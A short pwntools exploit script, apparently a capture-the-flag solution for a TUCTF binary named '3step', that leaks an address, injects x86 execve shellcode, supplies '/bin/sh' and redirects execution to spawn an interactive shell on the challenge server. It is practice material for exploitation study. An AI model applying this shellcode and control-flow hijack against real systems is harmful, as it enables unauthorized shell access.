from pwn import *
import sys
shellcode = "\x83\xC4\x10\x31\xC0\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80"

if len(sys.argv) < 2:
	r = process('./3step')
else:
	host, port = "chal.tuctf.com", 30504
	r = remote(host, port)
	
raw_input('debug')
r.recvuntil('snacks')
res = int(r.recv(11),16)
print hex(res)
r.recvuntil('Step 1: ')
r.sendline(shellcode)
r.recvuntil('Step 2: ')
r.sendline('/bin/sh\x00')
r.recvuntil('Step 3: ')
r.sendline(p32(res))

r.interactive()
r.close()